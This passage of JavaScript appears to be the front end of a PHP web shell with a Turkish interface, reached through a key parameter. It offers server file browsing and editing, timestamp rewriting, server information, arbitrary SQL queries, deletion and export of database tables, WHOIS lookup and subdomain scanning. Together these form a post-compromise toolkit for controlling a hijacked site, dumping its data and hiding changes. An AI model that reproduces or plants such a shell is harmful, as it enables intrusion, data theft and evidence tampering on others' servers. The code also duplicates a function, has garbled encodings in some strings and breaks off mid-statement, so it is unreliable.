function ctxNewFile(){new bootstrap.Modal(document.getElementById('newFileModal')).show();}
function ctxZipDownload(){if(ctxEl){var n=ctxEl.getAttribute('data-name');showPrompt('İndirme İsmi','<input type="text" id="ctxDlZipName" class="form-control form-control-sm" value="'+n.replace(/\.[^.]+$/,'')+'.zip">',function(){var zn=document.getElementById('ctxDlZipName').value;if(zn)asyncZipDownload([n],zn);});}}
function ctxZipServer(){if(ctxEl){var n=ctxEl.getAttribute('data-name');showPrompt('Sunucuya Ziple','<input type="text" id="zipNameVal" class="form-control form-control-sm" value="'+n.replace(/\.[^.]+$/,'')+'.zip">',function(){var zn=document.getElementById('zipNameVal').value;if(zn)asyncZipServer([n],zn);});}}
function ctxZipServer(){if(ctxEl){var n=ctxEl.getAttribute('data-name');showPrompt('Sunucuya Ziple','<input type="text" id="zipNameVal" class="form-control form-control-sm" value="'+n.replace(/\.[^.]+$/,'')+'.zip">',function(){var zn=document.getElementById('zipNameVal').value;if(zn)asyncZipServer([n],zn);});}}
function ctxUnzip(){if(ctxEl){var n=ctxEl.getAttribute('data-name');var ext=n.split('.').pop().toLowerCase();if(ext!=='zip'){showMsg('Sadece ZIP dosyaları çıkarılabilir!','error');return;}submitForm({action:'unzip',file:n});}}
function ctxTouch(){if(ctxEl){var n=ctxEl.getAttribute('data-name');var mt=ctxEl.getAttribute('data-mtime');var dt=epochToLocalDatetime(mt||Math.floor(Date.now()/1000));showPrompt('Tarih Düzenle','<input type="datetime-local" id="touchVal" class="form-control form-control-sm" value="'+dt+'">',function(){var t=document.getElementById('touchVal').value;if(t)submitFormArr({action:'touch',datetime:t},'items',[n]);});}}
function toggleFilter(){var p=document.getElementById('filterPanel');var cs=window.getComputedStyle(p).display;p.style.display=cs==='none'?'block':'none';}
function closeFilter(){document.getElementById('filterPanel').style.display='none';document.getElementById('filterInfo').style.display='none';location='?dir='+encodeURIComponent(ep(cDir))+'&key='+PASS;}
function applyFilter(){var tf=document.getElementById('timeFilter').value,ef=document.getElementById('extFilter').value,cs=document.getElementById('customStart').value,ce=document.getElementById('customEnd').value,srt=document.getElementById('filterSort').value,ord=document.getElementById('filterOrder').value,sv=document.getElementById('searchInput').value,st=document.getElementById('searchType').value;var wrap=document.getElementById('filterProgress'),bar=document.getElementById('filterBar');wrap.style.display='block';bar.style.width='0%';bar.textContent='0%';var pct=0;var intv=setInterval(function(){if(pct<90){pct+=Math.max(1,Math.round((90-pct)*0.1));bar.style.width=pct+'%';bar.textContent=pct+'%';}},200);var body='action=filter&timeFilter='+tf+'&extFilter='+ef+'&customStart='+cs+'&customEnd='+ce+'&sortBy='+srt+'&sortOrder='+ord;if(sv){body+='&searchType='+st+'&searchName='+encodeURIComponent(sv)+'&searchContent='+encodeURIComponent(sv);}fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body}).then(function(r){return r.json();}).then(function(d){clearInterval(intv);bar.style.width='100%';bar.textContent='100%';renderFiles(d);document.getElementById('filterInfo').innerHTML='<strong>'+d.length+'</strong> öğe bulundu';document.getElementById('filterInfo').style.display='block';setTimeout(function(){wrap.style.display='none';bar.style.width='0%';bar.textContent='0%';},700);}).catch(function(e){clearInterval(intv);bar.style.width='100%';bar.textContent='100%';showMsg('Hata: '+(e.message||e),'error');setTimeout(function(){wrap.style.display='none';bar.style.width='0%';bar.textContent='0%';},700);});}
function doSearch(){var t=document.getElementById('searchType').value,v=document.getElementById('searchInput').value,ef=document.getElementById('extFilter').value;if(!v){showMsg('Arama terimi girin!','error');return;}document.getElementById('filterPanel').style.display='block';var wrap=document.getElementById('filterProgress'),bar=document.getElementById('filterBar');wrap.style.display='block';bar.style.width='0%';bar.textContent='0%';var pct=0;var intv=setInterval(function(){if(pct<90){pct+=Math.max(1,Math.round((90-pct)*0.1));bar.style.width=pct+'%';bar.textContent=pct+'%';}},200);fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=search&searchType='+t+'&searchName='+encodeURIComponent(v)+'&searchContent='+encodeURIComponent(v)+'&extFilter='+ef}).then(function(r){return r.json();}).then(function(d){clearInterval(intv);bar.style.width='100%';bar.textContent='100%';renderFiles(d);document.getElementById('filterInfo').innerHTML='<strong>'+d.length+'</strong> sonuç';document.getElementById('filterInfo').style.display='block';setTimeout(function(){wrap.style.display='none';bar.style.width='0%';bar.textContent='0%';},700);}).catch(function(e){clearInterval(intv);bar.style.width='100%';bar.textContent='100%';showMsg('Hata: '+(e.message||e),'error');setTimeout(function(){wrap.style.display='none';bar.style.width='0%';bar.textContent='0%';},700);});}
function renderFiles(f){var h='';var docRoot='<?php echo addslashes(isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'');?>';var siteUrl='<?php echo (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$siteName;?>';for(var i=0;i<f.length;i++){var x=f[i];var ic=x.isDir?'<i class="bi bi-folder-fill text-warning"></i>':'<i class="bi bi-file-earmark"></i>';var lnk=x.isDir?'<a href="?dir='+encodeURIComponent(ep(x.path))+'&key='+PASS+'" class="file-link">'+x.name+'</a>':'<a href="#" onclick="editFile(\''+x.path.replace(/'/g,"\\'")+'\');return false;" class="file-link">'+x.name+'</a>';var dir=x.path.replace(/\\/g,'/').replace(/\/[^/]*$/,'');if(dir==='')dir='/';var rel=x.path.replace(docRoot,'').replace(/\\/g,'/');if(rel.charAt(0)!=='/')rel='/'+rel;var fileUrl=siteUrl+rel;var esc=x.path.replace(/'/g,"\\'").replace(/\\/g,'\\\\');var acts='<span class="fmenu-acts" data-url="'+fileUrl+'" data-dir="'+encodeURIComponent(ep(dir))+'" data-path="'+esc+'"><i class="bi bi-three-dots fmenu-btn" onclick="openFmenu(event,this.parentNode)"></i></span>';h+='<tr data-name="'+x.name+'" data-path="'+x.path+'" data-dir="'+(x.isDir?'1':'0')+'" data-size="'+x.size+'" data-ctime="'+x.ctime+'" data-mtime="'+x.mtime+'" data-perms="'+x.perms+'"><td><input type="checkbox" class="fc" value="'+x.name+'"></td><td><div class="fname-cell">'+ic+lnk+acts+'</div></td><td>'+(x.isDir?'-':fsize(x.size))+'</td><td>'+fdate(x.ctime)+'</td><td>'+fdate(x.mtime)+'</td><td>'+x.perms+'</td></tr>';}document.getElementById('fileList').innerHTML=h;document.querySelectorAll('#fileList tr').forEach(function(r){r.oncontextmenu=function(e){e.preventDefault();ctxEl=this;var m=document.getElementById('ctxMenu');m.style.display='block';m.style.left=Math.min(e.pageX,window.innerWidth-160)+'px';m.style.top=Math.min(e.pageY,window.innerHeight-350)+'px';};});}
function showServerInfo(){fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=serverInfo'}).then(function(r){return r.json();}).then(function(d){var h='';for(var k in d)h+='<tr><td><strong>'+k+'</strong></td><td>'+d[k]+'</td></tr>';document.getElementById('srvTable').innerHTML=h;new bootstrap.Modal(document.getElementById('serverInfoModal')).show();});}
function generateHashes(){var txt=document.getElementById('hashInput').value;if(!txt){showMsg('Metin girin!','error');return;}fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=hashGen&text='+encodeURIComponent(txt)}).then(function(r){return r.json();}).then(function(d){var h='';for(var k in d.hashes){h+='<div class="hash-row"><span class="hash-label">'+k+':</span><span class="hash-value">'+d.hashes[k]+'</span><i class="bi bi-clipboard hash-copy" onclick="copyToClip(\''+d.hashes[k].replace(/'/g,"\\'").replace(/\$/g,'\\$')+'\')"></i></div>';}document.getElementById('hashResults').innerHTML=h;});}
function dbConnect(){var h=document.getElementById('dbHost').value,u=document.getElementById('dbUser').value,p=document.getElementById('dbPass').value,d=document.getElementById('dbName').value;fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbConnect&host='+encodeURIComponent(h)+'&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p)+'&db='+encodeURIComponent(d)}).then(function(r){return r.json();}).then(function(r){if(r.success){document.getElementById('dbLogin').style.display='none';document.getElementById('dbPanel').style.display='block';dbRefreshDbs();dbLoadTables();syncDbFields(h,u,p,d);}else showMsg('Hata: '+r.error,'error');});}
function syncDbFields(h,u,p,d){document.getElementById('dbImportHost').value=h;document.getElementById('dbImportUser').value=u;document.getElementById('dbImportPass').value=p;document.getElementById('dbImportDb').value=d;document.getElementById('dbExportHost').value=h;document.getElementById('dbExportUser').value=u;document.getElementById('dbExportPass').value=p;document.getElementById('dbExportDb').value=d;}
function checkDbSession(){fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbCheckSession'}).then(function(r){return r.json();}).then(function(r){if(r.connected){document.getElementById('dbHost').value=r.h;document.getElementById('dbUser').value=r.u;document.getElementById('dbPass').value=r.p;document.getElementById('dbName').value=r.d;syncDbFields(r.h,r.u,r.p,r.d);document.getElementById('dbLogin').style.display='none';document.getElementById('dbPanel').style.display='block';dbRefreshDbs();dbLoadTables();}});}
document.getElementById('dbModal').addEventListener('show.bs.modal',function(){checkDbSession();});
function dbLogout(){fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbLogout'}).then(function(){document.getElementById('dbLogin').style.display='block';document.getElementById('dbPanel').style.display='none';document.getElementById('dbResult').innerHTML='';document.getElementById('dbTableList').innerHTML='';});}
function dbRefreshDbs(){fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbDatabases'}).then(function(r){return r.json();}).then(function(d){if(d.success){var h='';for(var i=0;i<d.databases.length;i++){var sel=d.databases[i]===d.current?' selected':'';h+='<option'+sel+'>'+d.databases[i]+'</option>';}document.getElementById('dbSelect').innerHTML=h;}});}
function dbChangeDb(){var d=document.getElementById('dbSelect').value;fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbSelectDb&db='+encodeURIComponent(d)}).then(function(r){return r.json();}).then(function(r){if(r.success){showMsg('Veritabanı değiştirildi: '+r.db,'success');dbLoadTables();document.getElementById('dbResult').innerHTML='';}else{showMsg('Hata: '+r.error,'error');}});}
function dbLoadTables(){fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbTables'}).then(function(r){return r.json();}).then(function(d){if(d.success){var h='';for(var i=0;i<d.tables.length;i++){h+='<div class="db-table-item" data-table="'+d.tables[i]+'" onclick="dbViewTable(\''+d.tables[i]+'\')"><input type="checkbox" class="db-tc" value="'+d.tables[i]+'" onclick="event.stopPropagation()"><span><i class="bi bi-table"></i> '+d.tables[i]+'</span><i class="bi bi-download" onclick="event.stopPropagation();dbExportTable(\''+d.tables[i]+'\')" title="Dışa Aktar"></i></div>';}document.getElementById('dbTableList').innerHTML=h;}});}
function dbToggleAll(){var ch=document.getElementById('dbSelectAll').checked;document.querySelectorAll('.db-tc').forEach(function(c){c.checked=ch;});}
function getSelectedTables(){var a=[];document.querySelectorAll('.db-tc:checked').forEach(function(c){a.push(c.value);});return a;}
function dbDeleteSelected(){var t=getSelectedTables();if(!t.length){showMsg('Tablo seçin!','error');return;}if(!confirm(t.length+' tablo silinecek?'))return;fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbDelete&tables='+encodeURIComponent(JSON.stringify(t))}).then(function(r){return r.json();}).then(function(d){if(d.success){showMsg(d.deleted+' tablo silindi','success');dbRefreshDbs();dbLoadTables();document.getElementById('dbResult').innerHTML='';document.getElementById('dbSelectAll').checked=false;}else{showMsg('Hata: '+d.error,'error');}});}
function dbTruncateSelected(){var t=getSelectedTables();if(!t.length){showMsg('Tablo seçin!','error');return;}if(!confirm(t.length+' tablo boşaltılacak?'))return;fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbTruncate&tables='+encodeURIComponent(JSON.stringify(t))}).then(function(r){return r.json();}).then(function(d){if(d.success){showMsg(d.truncated+' tablo boÅŸaltÄ±ldÄ±','success');dbRefreshDbs();dbLoadTables();document.getElementById('dbResult').innerHTML='';}else{showMsg('Hata: '+d.error,'error');}});}
function dbViewTable(t){currentTable=t;document.querySelectorAll('.db-table-item').forEach(function(el){el.classList.remove('active');if(el.getAttribute('data-table')===t)el.classList.add('active');});document.getElementById('dbQuery').value='SELECT * FROM `'+t+'` LIMIT 100';dbRun();}
function dbRun(){var q=document.getElementById('dbQuery').value;fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbQuery&query='+encodeURIComponent(q)}).then(function(r){return r.json();}).then(function(d){if(d.success){if(d.rows){var pk=d.columns[0];var h='<div style="overflow:auto;max-height:400px"><table class="table table-sm table-bordered table-striped" style="font-size:16px"><thead class="table-dark"><tr>';for(var i=0;i<d.columns.length;i++)h+='<th>'+d.columns[i]+'</th>';h+='</tr></thead><tbody>';for(var i=0;i<d.rows.length;i++){h+='<tr>';for(var j=0;j<d.columns.length;j++){var col=d.columns[j];var val=d.rows[i][col]||'';var pkVal=d.rows[i][pk];h+='<td contenteditable="true" data-col="'+col+'" data-pk="'+pk+'" data-pkv="'+pkVal+'" onblur="dbUpdateCell(this)" style="min-width:70px;max-width:250px;overflow:hidden">'+val+'</td>';}h+='</tr>';}h+='</tbody></table></div>';document.getElementById('dbResult').innerHTML=h;}else{document.getElementById('dbResult').innerHTML='<div class="alert alert-success py-2">'+d.affected+' satÄ±r etkilendi</div>';}}else{document.getElementById('dbResult').innerHTML='<div class="alert alert-danger py-2">'+d.error+'</div>';}});}
function dbUpdateCell(el){var col=el.getAttribute('data-col');var pk=el.getAttribute('data-pk');var pkv=el.getAttribute('data-pkv');var val=el.innerText;if(!currentTable)return;fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbUpdate&table='+encodeURIComponent(currentTable)+'&pk='+encodeURIComponent(pk)+'&pkv='+encodeURIComponent(pkv)+'&col='+encodeURIComponent(col)+'&val='+encodeURIComponent(val)}).then(function(r){return r.json();}).then(function(d){if(d.success){el.style.background='#d4edda';setTimeout(function(){el.style.background='';},1000);}else{showMsg('Güncelleme hatası: '+d.error,'error');}});}
function dbExportTable(t){var f=document.createElement('form');f.method='post';f.innerHTML='<input type="hidden" name="action" value="dbExport"><input type="hidden" name="tables" value=\'["'+t+'"]\' ><input type="hidden" name="tableName" value="'+t+'">';document.body.appendChild(f);f.submit();}
function dbExportAll(){var t=[];document.querySelectorAll('.db-tc').forEach(function(c){t.push(c.value);});if(!t.length){showMsg('Tablo yok!','error');return;}var f=document.createElement('form');f.method='post';f.innerHTML='<input type="hidden" name="action" value="dbExport"><input type="hidden" name="tables" value=\''+JSON.stringify(t)+'\' >';document.body.appendChild(f);f.submit();}
function dbImport(){var file=document.getElementById('dbSqlFile').files[0];if(!file){showMsg('Dosya seçin!','error');return;}var formData=new FormData();formData.append('action','dbImport');formData.append('sqlfile',file);fetch('',{method:'POST',body:formData}).then(function(r){return r.json();}).then(function(d){if(d.success){showMsg(d.message,'success');dbLoadTables();}else{showMsg('Hata: '+d.error,'error');}document.getElementById('dbSqlFile').value='';});}
var dbExportSession={h:'',u:'',p:'',d:'',tables:[]};
function dbImportTab(){var h=document.getElementById('dbImportHost').value;var u=document.getElementById('dbImportUser').value;var p=document.getElementById('dbImportPass').value;var d=document.getElementById('dbImportDb').value;var file=document.getElementById('dbImportFile').files[0];if(!file){showMsg('SQL dosyasi secin!','error');return;}if(!h||!u||!d){showMsg('Bağlanti bilgilerini girin!','error');return;}document.getElementById('dbImportResult').innerHTML='<div class="alert alert-info py-1">İçe Aktariliyor...</div>';var formData=new FormData();formData.append('action','dbImportTab');formData.append('host',h);formData.append('user',u);formData.append('pass',p);formData.append('db',d);formData.append('sqlfile',file);fetch('',{method:'POST',body:formData}).then(function(r){return r.json();}).then(function(res){if(res.success){document.getElementById('dbImportResult').innerHTML='<div class="alert alert-success py-1">'+res.message+'</div>';}else{document.getElementById('dbImportResult').innerHTML='<div class="alert alert-danger py-1">Hata: '+res.error+'</div>';}document.getElementById('dbImportFile').value='';});}
function dbExportConnect(){var h=document.getElementById('dbExportHost').value;var u=document.getElementById('dbExportUser').value;var p=document.getElementById('dbExportPass').value;var d=document.getElementById('dbExportDb').value;if(!h||!u||!d){showMsg('Bağlanti bilgilerini girin!','error');return;}dbExportSession={h:h,u:u,p:p,d:d,tables:[]};document.getElementById('dbExportTables').innerHTML='<div class="text-muted">Yukleniyor...</div>';fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=dbExportList&host='+encodeURIComponent(h)+'&user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p)+'&db='+encodeURIComponent(d)}).then(function(r){return r.json();}).then(function(res){if(res.success){dbExportSession.tables=res.tables;var html='<div class="mb-2"><input type="checkbox" id="dbExportSelectAll" onchange="dbExportToggleAll()"> <label for="dbExportSelectAll">Tumunu Sec</label></div>';for(var i=0;i<res.tables.length;i++){html+='<div class="form-check"><input class="form-check-input db-export-tc" type="checkbox" value="'+res.tables[i]+'" id="expTbl'+i+'"><label class="form-check-label" for="expTbl'+i+'">'+res.tables[i]+'</label></div>';}document.getElementById('dbExportTables').innerHTML=html;document.getElementById('dbExportBtn').disabled=false;}else{document.getElementById('dbExportTables').innerHTML='<div class="alert alert-danger py-1">Hata: '+res.error+'</div>';document.getElementById('dbExportBtn').disabled=true;}});}
function dbExportToggleAll(){var ch=document.getElementById('dbExportSelectAll').checked;document.querySelectorAll('.db-export-tc').forEach(function(c){c.checked=ch;});}
function dbExportSelected(){var tables=[];document.querySelectorAll('.db-export-tc:checked').forEach(function(c){tables.push(c.value);});if(!tables.length){showMsg('Tablo secin!','error');return;}var f=document.createElement('form');f.method='post';f.innerHTML='<input type="hidden" name="action" value="dbExportTab"><input type="hidden" name="host" value="'+dbExportSession.h+'"><input type="hidden" name="user" value="'+dbExportSession.u+'"><input type="hidden" name="pass" value="'+dbExportSession.p+'"><input type="hidden" name="db" value="'+dbExportSession.d+'"><input type="hidden" name="tables" value=\''+JSON.stringify(tables)+'\'>';document.body.appendChild(f);f.submit();}
function getInfo(){var domain=document.getElementById('infoDomain').value;if(!domain){showMsg('Domain girin!','error');return;}document.getElementById('whoisProgress').style.display='block';var bar=document.getElementById('whoisBar');var pct=0;var intv=setInterval(function(){if(pct<90){pct+=5;bar.style.width=pct+'%';bar.textContent=pct+'%';}},200);fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=infoCollect&domain='+encodeURIComponent(domain)}).then(function(r){return r.json();}).then(function(d){clearInterval(intv);bar.style.width='100%';bar.textContent='100%';var h='<table class="table table-sm" style="font-size:15px">';h+='<tr><td width="140"><strong>Domain</strong></td><td>'+d.domain+'</td></tr>';h+='<tr><td><strong>IP</strong></td><td>'+d.ip+'</td></tr>';h+='<tr><td><strong>Kayıtçı</strong></td><td>'+(d.registrar||'-')+'</td></tr>';h+='<tr><td><strong>Sahip</strong></td><td>'+(d.owner||'-')+'</td></tr>';h+='<tr><td><strong>Organizasyon</strong></td><td>'+(d.org||'-')+'</td></tr>';h+='<tr><td><strong>E-posta</strong></td><td>'+(d.email||'-')+'</td></tr>';h+='<tr><td><strong>Telefon</strong></td><td>'+(d.phone||'-')+'</td></tr>';h+='<tr><td><strong>Ülke</strong></td><td>'+(d.country||'-')+'</td></tr>';h+='<tr><td><strong>Şehir</strong></td><td>'+(d.city||'-')+'</td></tr>';h+='<tr><td><strong>Kayıt Tarihi</strong></td><td>'+(d.created||'-')+'</td></tr>';h+='<tr><td><strong>Güncelleme</strong></td><td>'+(d.updated||'-')+'</td></tr>';h+='<tr><td><strong>Bitiş Tarihi</strong></td><td>'+(d.expires||'-')+'</td></tr>';if(d.age)h+='<tr><td><strong>Domain Yaşı</strong></td><td>'+d.age+'</td></tr>';if(d.remaining)h+='<tr><td><strong>Kalan Süre</strong></td><td>'+d.remaining+'</td></tr>';if(d.nameservers&&d.nameservers.length)h+='<tr><td><strong>DNS Sunucuları</strong></td><td>'+d.nameservers.join(', ')+'</td></tr>';if(d.status&&d.status.length)h+='<tr><td><strong>Durum</strong></td><td>'+d.status.join(', ')+'</td></tr>';h+='</table>';document.getElementById('infoResult').innerHTML=h;setTimeout(function(){document.getElementById('whoisProgress').style.display='none';bar.style.width='0%';},1000);});}
function scanSubdomains(){var domain=document.getElementById('subDomain').value;if(!domain){showMsg('Domain girin!','error');return;}document.getElementById('subProgress').style.display='block';var bar=document.getElementById('subBar');var pct=0;var intv=setInterval(function(){if(pct<90){pct+=3;bar.style.width=pct+'%';bar.textContent=pct+'%';}},300);fetch('',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=subdomains&domain='+encodeURIComponent(domain)}).then(function(r){return r.json();}).then(function(d){clearInterval(intv);bar.style.width='100%';bar.textContent='100%';var h='<div class="row g-3"><div class="col-md-6"><div class="border rounded p-2"><h6 class="text-success mb-2"><i class="bi bi-check-circle"></i> Aktif ('+(d.active?d.active.length:0)+')</h6><div style="max-height:300px;overflow:auto"><table class="table table-sm" style="font-size:16px"><thead><tr><th>Host</th><th>IP</th></tr></thead><tbody>';if(d.active&&d.active.length){for(var i=0;i<d.active.length;i++){h+='<tr><td><a href="http://'+d.active[i].h+'" target="_blank">'+d.active[i].h+'</a></td><td>'+d.active[i].i+'</td></tr>';}}else{h+='<tr><td colspan="2" class="text-muted text-center">Bulunamadı</td></tr>';}h+='</tbody></table></div></div></div><div class="col-md-6"><div class="border rounded p-2"><h6 class="text-warning mb-2"><i class="bi bi-dash-circle"></i> Pasif ('+(d.passive?d.passive.length:0)+')</h6><div style="max-height:300px;overflow:auto"><table class="table table-sm" style="font-size:16px"><thead><tr><th>Host</th><th>Durum</th></tr></thead><tbody>';if(d.passive&&d.passive.length){for(var i=0;i<d.passive.length;i++){h+='<tr><td>'+d.passive[i].h+'</td><td><span class="badge bg-secondary">Pasif</span></td></tr>';}}else{h+='<tr><td colspan="2" class="text-muted text-center">Bulunamadı</td></tr>';}h+='</tbody></table></div></div></div></div>';var totalCount=(d.total!==undefined?d.total:((d.active?d.active.length:0)+(d.passive?d.passive.length:0)));h+